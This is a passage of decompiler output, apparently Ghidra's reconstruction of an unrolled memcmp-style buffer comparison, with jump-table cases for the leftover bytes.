       (iVar3 = (uint)(uVar4 != uVar5 && -1 < (int)(uVar4 - uVar5)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar4 = (uint)*(byte *)((int)_Buf1 + 3);
    uVar5 = (uint)*(byte *)((int)_Buf2 + 3);
    goto LAB_003b0604;
  }
  for (; 0x1f < _Size; _Size = _Size - 0x20) {
                    // WARNING: Load size is inaccurate
                    // WARNING: Load size is inaccurate
    if (*_Buf1 == *_Buf2) {
      iVar3 = 0;
    }
    else {
                    // WARNING: Load size is inaccurate
      uVar5 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
      uVar4 = (uint)*_Buf2;
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 1);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 1);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 2);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 2);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      iVar3 = (uint)*(byte *)((int)_Buf1 + 3) - (uint)*(byte *)((int)_Buf2 + 3);
      if (iVar3 != 0) {
        iVar3 = (uint)(0 < iVar3) * 2 + -1;
      }
    }
    if (iVar3 != 0) {
      return iVar3;
    }
    if (*(int *)((int)_Buf1 + 4) == *(int *)((int)_Buf2 + 4)) {
      iVar3 = 0;
    }
    else {
      uVar5 = (uint)*(byte *)((int)_Buf1 + 4);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 4);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 5);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 5);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 6);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 6);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      iVar3 = (uint)*(byte *)((int)_Buf1 + 7) - (uint)*(byte *)((int)_Buf2 + 7);
      if (iVar3 != 0) {
        iVar3 = (uint)(0 < iVar3) * 2 + -1;
      }
    }
    if (iVar3 != 0) {
      return iVar3;
    }
    if (*(int *)((int)_Buf1 + 8) == *(int *)((int)_Buf2 + 8)) {
      iVar3 = 0;
    }
    else {
      uVar5 = (uint)*(byte *)((int)_Buf1 + 8);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 8);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 9);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 9);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 10);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 10);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      iVar3 = (uint)*(byte *)((int)_Buf1 + 0xb) - (uint)*(byte *)((int)_Buf2 + 0xb);
      if (iVar3 != 0) {
        iVar3 = (uint)(0 < iVar3) * 2 + -1;
      }
    }
    if (iVar3 != 0) {
      return iVar3;
    }
    if (*(int *)((int)_Buf1 + 0xc) == *(int *)((int)_Buf2 + 0xc)) {
      iVar3 = 0;
    }
    else {
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0xc);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0xc);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0xd);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0xd);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0xe);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0xe);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      iVar3 = (uint)*(byte *)((int)_Buf1 + 0xf) - (uint)*(byte *)((int)_Buf2 + 0xf);
      if (iVar3 != 0) {
        iVar3 = (uint)(0 < iVar3) * 2 + -1;
      }
    }
    if (iVar3 != 0) {
      return iVar3;
    }
    if (*(int *)((int)_Buf1 + 0x10) == *(int *)((int)_Buf2 + 0x10)) {
      iVar3 = 0;
    }
    else {
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0x10);
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0x10);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0x11);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0x11);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0x12);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0x12);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      iVar3 = (uint)*(byte *)((int)_Buf1 + 0x13) - (uint)*(byte *)((int)_Buf2 + 0x13);
      if (iVar3 != 0) {
        iVar3 = (uint)(0 < iVar3) * 2 + -1;
      }
    }
    if (iVar3 != 0) {
      return iVar3;
    }
    if (*(int *)((int)_Buf1 + 0x14) == *(int *)((int)_Buf2 + 0x14)) {
      iVar3 = 0;
    }
    else {
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0x14);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0x14);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0x15);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0x15);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0x16);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0x16);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      iVar3 = (uint)*(byte *)((int)_Buf1 + 0x17) - (uint)*(byte *)((int)_Buf2 + 0x17);
      if (iVar3 != 0) {
        iVar3 = (uint)(0 < iVar3) * 2 + -1;
      }
    }
    if (iVar3 != 0) {
      return iVar3;
    }
    if (*(int *)((int)_Buf1 + 0x18) == *(int *)((int)_Buf2 + 0x18)) {
      iVar3 = 0;
    }
    else {
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0x18);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0x18);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0x19);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0x19);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0x1a);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0x1a);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      iVar3 = (uint)*(byte *)((int)_Buf1 + 0x1b) - (uint)*(byte *)((int)_Buf2 + 0x1b);
      if (iVar3 != 0) {
        iVar3 = (uint)(0 < iVar3) * 2 + -1;
      }
    }
    if (iVar3 != 0) {
      return iVar3;
    }
    if (*(int *)((int)_Buf1 + 0x1c) == *(int *)((int)_Buf2 + 0x1c)) {
      iVar3 = 0;
    }
    else {
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0x1c);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0x1c);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0x1d);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0x1d);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      uVar5 = (uint)*(byte *)((int)_Buf1 + 0x1e);
      uVar4 = (uint)*(byte *)((int)_Buf2 + 0x1e);
      if ((uVar5 != uVar4) &&
         (iVar3 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar3 != 0)) {
        return iVar3;
      }
      iVar3 = (uint)*(byte *)((int)_Buf1 + 0x1f) - (uint)*(byte *)((int)_Buf2 + 0x1f);
      if (iVar3 != 0) {
        iVar3 = (uint)(0 < iVar3) * 2 + -1;
      }
    }
    if (iVar3 != 0) {
      return iVar3;
    }
    _Buf1 = (void *)((int)_Buf1 + 0x20);
    _Buf2 = (void *)((int)_Buf2 + 0x20);
  }
  pbVar1 = (byte *)((int)_Buf1 + _Size);
  iVar3 = (int)_Buf2 + _Size;
  switch(_Size) {
  default:
    goto switchD_003af658_caseD_0;
  case 1:
    goto switchD_003af658_caseD_1;
  case 2:
    goto switchD_003af658_caseD_2;
  case 3:
    goto switchD_003af658_caseD_3;
  case 4:
    goto switchD_003af658_caseD_4;
  case 5:
    goto switchD_003af658_caseD_5;
  case 6:
    goto switchD_003af658_caseD_6;
  case 7:
    goto switchD_003af658_caseD_7;
  case 8:
    goto switchD_003af658_caseD_8;
  case 9:
    goto switchD_003af658_caseD_9;
  case 10:
    goto switchD_003af658_caseD_a;
  case 0xb:
    goto switchD_003af658_caseD_b;
  case 0xc:
    goto switchD_003af658_caseD_c;
  case 0xd:
    goto switchD_003af658_caseD_d;
  case 0xe:
    goto switchD_003af658_caseD_e;
  case 0xf:
    goto switchD_003af658_caseD_f;
  case 0x10:
    goto switchD_003af658_caseD_10;
  case 0x11:
    goto switchD_003af658_caseD_11;
  case 0x12:
    goto switchD_003af658_caseD_12;
  case 0x13:
    goto switchD_003af658_caseD_13;
  case 0x14:
    goto switchD_003af658_caseD_14;
  case 0x15:
    goto switchD_003af658_caseD_15;
  case 0x16:
    goto switchD_003af658_caseD_16;
  case 0x17:
    goto switchD_003af658_caseD_17;
  case 0x18:
    goto switchD_003af658_caseD_18;
  case 0x1a:
    goto switchD_003af658_caseD_1a;
  case 0x1b:
    goto switchD_003af658_caseD_1b;
  case 0x1c:
    if (*(uint *)(pbVar1 + -0x1c) == *(uint *)(iVar3 + -0x1c)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x1c) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x1c);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x1b];
      uVar4 = (uint)*(byte *)(iVar3 + -0x1b);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x1a];
      uVar4 = (uint)*(byte *)(iVar3 + -0x1a);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0x19] - (uint)*(byte *)(iVar3 + -0x19);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_18:
    if (*(uint *)(pbVar1 + -0x18) == *(uint *)(iVar3 + -0x18)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x18) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x18);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x17];
      uVar4 = (uint)*(byte *)(iVar3 + -0x17);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x16];
      uVar4 = (uint)*(byte *)(iVar3 + -0x16);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0x15] - (uint)*(byte *)(iVar3 + -0x15);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_14:
    if (*(uint *)(pbVar1 + -0x14) == *(uint *)(iVar3 + -0x14)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x14) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x14);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x13];
      uVar4 = (uint)*(byte *)(iVar3 + -0x13);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x12];
      uVar4 = (uint)*(byte *)(iVar3 + -0x12);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0x11] - (uint)*(byte *)(iVar3 + -0x11);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_10:
    if (*(uint *)(pbVar1 + -0x10) == *(uint *)(iVar3 + -0x10)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x10) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x10);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0xf];
      uVar4 = (uint)*(byte *)(iVar3 + -0xf);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0xe];
      uVar4 = (uint)*(byte *)(iVar3 + -0xe);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0xd] - (uint)*(byte *)(iVar3 + -0xd);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_c:
    if (*(int *)(pbVar1 + -0xc) == *(int *)(iVar3 + -0xc)) {
      iVar2 = 0;
    }
    else {
      uVar4 = (uint)*(byte *)(iVar3 + -0xc);
      uVar5 = (uint)pbVar1[-0xc];
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0xb];
      uVar4 = (uint)*(byte *)(iVar3 + -0xb);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-10];
      uVar4 = (uint)*(byte *)(iVar3 + -10);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-9] - (uint)*(byte *)(iVar3 + -9);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_8:
    if (*(uint *)(pbVar1 + -8) == *(uint *)(iVar3 + -8)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -8) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -8);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-7];
      uVar4 = (uint)*(byte *)(iVar3 + -7);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-6];
      uVar4 = (uint)*(byte *)(iVar3 + -6);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-5] - (uint)*(byte *)(iVar3 + -5);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 == 0) {
switchD_003af658_caseD_4:
      if (*(uint *)(pbVar1 + -4) == *(uint *)(iVar3 + -4)) {
        iVar2 = 0;
      }
      else {
        uVar5 = *(uint *)(pbVar1 + -4) & 0xff;
        uVar4 = (uint)*(byte *)(iVar3 + -4);
        if ((uVar5 == uVar4) ||
           (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 == 0)) {
          uVar5 = (uint)pbVar1[-3];
          uVar4 = (uint)*(byte *)(iVar3 + -3);
          if ((uVar5 == uVar4) ||
             (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 == 0)) {
            uVar5 = (uint)pbVar1[-2];
            uVar4 = (uint)*(byte *)(iVar3 + -2);
            if (((uVar5 == uVar4) ||
                (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 == 0))
               && (iVar2 = (uint)pbVar1[-1] - (uint)*(byte *)(iVar3 + -1), iVar2 != 0)) {
              iVar2 = (uint)(0 < iVar2) * 2 + -1;
            }
          }
        }
      }
      if (iVar2 == 0) {
switchD_003af658_caseD_0:
        iVar2 = 0;
      }
    }
    return iVar2;
  case 0x1d:
    if (*(uint *)(pbVar1 + -0x1d) == *(uint *)(iVar3 + -0x1d)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x1d) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x1d);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x1c];
      uVar4 = (uint)*(byte *)(iVar3 + -0x1c);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x1b];
      uVar4 = (uint)*(byte *)(iVar3 + -0x1b);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0x1a] - (uint)*(byte *)(iVar3 + -0x1a);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
  case 0x19:
    if (*(uint *)(pbVar1 + -0x19) == *(uint *)(iVar3 + -0x19)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x19) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x19);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x18];
      uVar4 = (uint)*(byte *)(iVar3 + -0x18);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x17];
      uVar4 = (uint)*(byte *)(iVar3 + -0x17);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0x16] - (uint)*(byte *)(iVar3 + -0x16);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_15:
    if (*(uint *)(pbVar1 + -0x15) == *(uint *)(iVar3 + -0x15)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x15) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x15);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x14];
      uVar4 = (uint)*(byte *)(iVar3 + -0x14);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x13];
      uVar4 = (uint)*(byte *)(iVar3 + -0x13);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0x12] - (uint)*(byte *)(iVar3 + -0x12);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_11:
    if (*(uint *)(pbVar1 + -0x11) == *(uint *)(iVar3 + -0x11)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0x11) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0x11);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0x10];
      uVar4 = (uint)*(byte *)(iVar3 + -0x10);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0xf];
      uVar4 = (uint)*(byte *)(iVar3 + -0xf);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-0xe] - (uint)*(byte *)(iVar3 + -0xe);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_d:
    if (*(uint *)(pbVar1 + -0xd) == *(uint *)(iVar3 + -0xd)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -0xd) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -0xd);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0xc];
      uVar4 = (uint)*(byte *)(iVar3 + -0xc);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-0xb];
      uVar4 = (uint)*(byte *)(iVar3 + -0xb);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-10] - (uint)*(byte *)(iVar3 + -10);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_9:
    if (*(int *)(pbVar1 + -9) == *(int *)(iVar3 + -9)) {
      iVar2 = 0;
    }
    else {
      uVar4 = (uint)*(byte *)(iVar3 + -9);
      uVar5 = (uint)pbVar1[-9];
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-8];
      uVar4 = (uint)*(byte *)(iVar3 + -8);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-7];
      uVar4 = (uint)*(byte *)(iVar3 + -7);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)pbVar1[-6] - (uint)*(byte *)(iVar3 + -6);
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_003af658_caseD_5:
    if (*(uint *)(pbVar1 + -5) == *(uint *)(iVar3 + -5)) {
      iVar2 = 0;
    }
    else {
      uVar5 = *(uint *)(pbVar1 + -5) & 0xff;
      uVar4 = (uint)*(byte *)(iVar3 + -5);
      if ((uVar5 != uVar4) &&
         (iVar2 = (uint)(uVar5 != uVar4 && -1 < (int)(uVar5 - uVar4)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar5 = (uint)pbVar1[-4];
      uVar4 = (uint)*(byte *)(iVar3 + -4);
      if ((uVar5 != uVar4) &&
